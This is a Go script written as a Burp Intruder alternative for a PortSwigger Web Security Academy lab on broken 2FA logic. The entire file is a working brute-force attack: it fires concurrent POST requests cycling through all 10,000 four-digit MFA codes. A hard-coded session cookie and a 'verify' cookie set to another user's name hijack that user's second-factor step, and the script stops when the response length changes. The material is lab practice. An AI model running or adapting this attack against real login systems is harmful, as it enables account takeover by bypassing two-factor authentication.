//Creator Oier Zalba 
//Date 25/11/2022
//Burpsuite intruder alternative
//Scritp example for "2FA broken logic" portswigger lab
//Edit the loop as you wish

package main

import (
  "fmt"
  "net/http"
  "net/http/cookiejar"
  "sync"
  "log"
  "io/ioutil"
  "bytes"
  "os"
  "math"
  "time"
)

//Insert your url
var url = "https://0aa9007304fc5770c06d094c00b3009d.web-security-academy.net/login2"
//Miliseconds to wait every 10 querys, increase if the server doesn't handle it, change it below
var client http.Client


//Init function to creation of cookies
func init() {
	jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatalf("Error while creating cookie jar %s", err.Error())
	}
	client = http.Client{
		Jar: jar,
	}
}

//Goroutine to create concurrency
func save_page_to_html( s string, req *http.Request, wg *sync.WaitGroup) (int) { 
    
   resp, err := client.Do(req)
   //Handle Error
   if err != nil {
      log.Fatalf("An Error Occured %v", err)
   }
   defer resp.Body.Close()
    
   //Read the response body
   body, err := ioutil.ReadAll(resp.Body)
   if err != nil {
      log.Fatalln(err)
   }
   
   length := len(body)
   fmt.Println("mfa-code:",s,"Status code:", resp.StatusCode,"Lenght response:", length)
   //To print the response
   //sb := string(body)
   //log.Printf(sb)
   
   //The stop signal
   if length != 4393{
       fmt.Println("*************************************************")
       fmt.Println("Stop signal send, code found")
       fmt.Println("The code is:",s)
       os.Exit(1)
   }
   

   wg.Done()
   return resp.StatusCode
}

func main() {
    
    var wg sync.WaitGroup //Manage goroutines
    
    //Loop
    for i := 0; i < 10000; i++ {
        
        wg.Add(1)
        
        //Post body
        s := fmt.Sprintf("%04d", i)
        str := "mfa-code="+s
        jsonBody := []byte(str)
        bodyReader := bytes.NewReader(jsonBody)
        
	    req, err := http.NewRequest(http.MethodPost, url, bodyReader)
	    if err != nil {
		    log.Fatalf("Got error %s", err.Error())
	    }
	    
	    //Cookies
	    cookie := &http.Cookie{
		    Name:   "session",
		    Value:  "cwVarbuVgtInOL61uwtrlFibXwhtQZxP",
		    MaxAge: 300,
	    }
	    cookie2 := &http.Cookie{
		    Name:   "verify",
		    Value:  "carlos",
		    MaxAge: 300,
	    }

	    req.AddCookie(cookie)
	    req.AddCookie(cookie2)
        
        go save_page_to_html(s,req, &wg)
        
        //Timeout to dont saturate de server
        if math.Mod(float64(i),10) == 9{
            time.Sleep(time.Millisecond * 120)
        }

        
    }
    
    wg.Wait()
    fmt.Println("Finished")

}
